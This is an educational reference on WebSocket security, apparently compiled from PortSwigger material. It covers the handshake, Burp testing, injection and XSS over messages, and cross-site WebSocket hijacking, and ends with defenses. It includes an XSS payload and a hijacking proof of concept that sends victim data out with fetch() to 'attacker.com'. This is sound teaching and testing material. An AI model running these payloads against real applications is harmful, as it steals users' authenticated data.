# WebSocket security — deep reference

Source: https://portswigger.net/web-security/websockets
(+ https://portswigger.net/web-security/websockets/what-are-websockets
and https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)

WebSockets are initiated over HTTP and provide long-lived, full-duplex
(bidirectional, asynchronous) connections. They are used wherever the app needs
real-time push: chat, live feeds, notifications, dashboards, collaborative
editing, gaming. The vulnerability classes mirror normal web vulns — the
transport is just different.

---

## 1. The WebSocket handshake

A WebSocket connection starts with an HTTP request that asks to upgrade the
connection:

```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Upgrade: websocket
Origin: https://normal-website.com
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEpa6db
```

Server response:

```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

Key points:
- After `101 Switching Protocols`, both sides send/receive **messages**
  asynchronously over the same TCP connection.
- `Sec-WebSocket-Key` is a random value to prevent caching-proxy errors — it is
  **not** an authentication or anti-CSRF mechanism. `Sec-WebSocket-Accept` is
  derived from it. Do not treat either as a security control.
- `Origin` is set by the browser and indicates the page that initiated the
  connection — the server's only built-in clue about cross-site requests.
- Authentication context (cookies, etc.) is established at the handshake; the
  message stream inherits it.

Client API (JS):
```js
const ws = new WebSocket('wss://normal-website.com/chat');
ws.onopen    = () => ws.send('Hello');
ws.onmessage = (event) => console.log(event.data);
```

---

## 2. Intercepting, manipulating, and replaying traffic (Burp)

**Intercept**
- Enable interception in Burp Proxy and browse the WS feature.
- Messages appear in the **WebSockets history** tab.
- Modify a message before forwarding it. Interception rules (Settings) control
  whether client-to-server, server-to-client, or both directions are intercepted.

**Replay / generate (Repeater)**
- Send a single message repeatedly, editing it each time.
- Generate brand-new messages in either direction.
- Browse transmission history (browser- and server-generated) and
  "Edit and resend" any historical message.

**Manipulate the handshake**
- Use the pencil icon next to the WebSocket URL in Repeater to:
  attach to an existing connection, clone a connected WebSocket, reconnect a
  disconnected one, and **edit full handshake request details** (headers,
  cookies, Origin) before reconnecting.
- This is how you test Origin validation and token requirements: forge/remove
  `Origin`, drop the CSRF token, swap cookies, and see whether the handshake
  still succeeds.

---

## 3. Input-based vulnerabilities over WebSockets

Treat every client-controlled message field as untrusted input feeding a
server-side sink — exactly as with HTTP parameters.

- **SQL injection:** message values used in DB queries. Inject SQL syntax in a
  field, observe errors / changed responses / boolean or time differences.
- **XML external entity (XXE):** if messages are XML-parsed server-side, test
  classic XXE (external entity, OOB exfil).
- **XSS (server-broadcast):** a message like
  `{"message":"<img src=1 onerror='alert(1)'>"}` that the server stores and
  rebroadcasts to other users without sanitization fires in their browsers.
- **Command injection / SSRF / path traversal / NoSQL / deserialization:** any
  sink reachable from a message field is in play; methodology is identical to
  HTTP, only the channel changes.

Method: enumerate every field in every message type, fuzz each one, and trace
where its value surfaces (response, other users, logs, downstream service).

---

## 4. Blind vulnerabilities (OAST)

When an injection produces no observable difference in the WS responses, use
**out-of-band application security testing (OAST)** — e.g. Burp Collaborator
payloads — to detect server-side execution: blind SQLi via DNS/HTTP callback,
blind XXE OOB exfil, blind command injection, blind SSRF. The callback proves
the payload reached and executed in the backend.

---

## 5. Client-side XSS from WebSocket messages

The risk runs in both directions. If the client renders **server-to-client**
message content into the DOM unsafely (`innerHTML`, jQuery `.html()`,
templating without escaping), an attacker who can influence those messages
(directly, or via a stored message broadcast) achieves DOM/stored XSS in
victims' browsers. Audit the client message handler (`ws.onmessage`) for unsafe
sinks. Treat data received over the WebSocket as untrusted on the client too.

---

## 6. Cross-site WebSocket hijacking (CSWSH)

A CSRF vulnerability on the **WebSocket handshake**. Unlike classic CSRF (fire
a one-way request), CSWSH gives the attacker **two-way** authenticated
interaction: read responses *and* send messages.

**Conditions (all three converge):**
1. The handshake authenticates using **HTTP cookies alone** for session
   handling — so the browser auto-attaches them cross-site.
2. The handshake has **no CSRF token or other unpredictable value** that an
   attacker page cannot know/guess.
3. The server does **not validate the `Origin`** header, so it accepts
   handshakes initiated from arbitrary origins.

**Exploit:** host a page on an attacker origin. When a logged-in victim visits,
the page opens a WS to the target; the browser includes the victim's session
cookie, authenticating the connection in the victim's context. The attacker
script then reads server messages and exfiltrates them, and/or sends privileged
messages.

```html
<!doctype html>
<script>
  const ws = new WebSocket('wss://target-app.com/chat');
  ws.onopen    = () => ws.send('READY');           // trigger data the victim can see
  ws.onmessage = (e) => {
    fetch('https://attacker.com/exfil?d=' + encodeURIComponent(e.data),
          { mode: 'no-cors' });                      // exfil victim-authorized data
  };
</script>
```

**Impact:** retrieve sensitive data the victim can access (chat history,
account info, tokens) and/or perform unauthorized privileged actions as the
victim. For a safe PoC, prove **read-only** data exfil; avoid state-changing
messages.

---

## 7. Securing WebSockets

- Use **`wss://`** (WebSockets over TLS) for encryption.
- **Hard-code the endpoint URL**; never build it from user-controllable data.
- **Protect the handshake against CSRF:** include a CSRF token / unpredictable
  value in the handshake request and verify it server-side — defeats CSWSH.
- **Validate the `Origin` header** on the handshake against an allowlist.
- **Treat WS data as untrusted in both directions:** handle/sanitize/encode
  safely on both server and client to prevent injection and DOM XSS.

---

## 8. Triage checklist
- Is the handshake cookie-only with no token and no Origin check? → test CSWSH.
- Does any message field reach a backend sink? → test SQLi/XXE/cmd injection
  (+ OAST for blind).
- Are server messages rendered unsafely in the client DOM? → test XSS.
- Does the endpoint carry sensitive/cross-user data at all? If not, likely not
  worth reporting.
